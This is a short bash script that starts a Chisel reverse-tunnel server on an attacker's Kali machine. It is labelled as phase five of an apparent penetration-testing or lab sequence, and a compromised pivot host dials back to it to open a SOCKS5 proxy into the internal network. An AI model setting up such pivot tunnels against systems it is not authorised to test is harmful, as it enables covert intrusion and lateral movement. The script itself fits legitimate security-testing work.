#!/usr/bin/env bash
# chisel_server.sh — Phase 5. Start the Chisel reverse-tunnel server on the
# ATTACKER (Kali). The pivot's client dials back to this and exposes a SOCKS5
# proxy on this host at 127.0.0.1:1080.
#
# Usage:  ./chisel_server.sh [listen_port]   (default 8080)
set -euo pipefail

PORT="${1:-8080}"
CHISEL="$(command -v chisel || echo /tmp/chisel)"

if [ ! -x "$CHISEL" ]; then
  echo "[!] chisel binary not found (looked in PATH and /tmp/chisel)." >&2
  exit 1
fi

echo "[*] Chisel server starting on 0.0.0.0:${PORT} (reverse tunnelling enabled)"
echo "[*] When the pivot connects, a SOCKS5 proxy appears on 127.0.0.1:1080"
echo "[*] Leave this running; Ctrl-C to stop."
exec "$CHISEL" server -p "${PORT}" --reverse --socks5
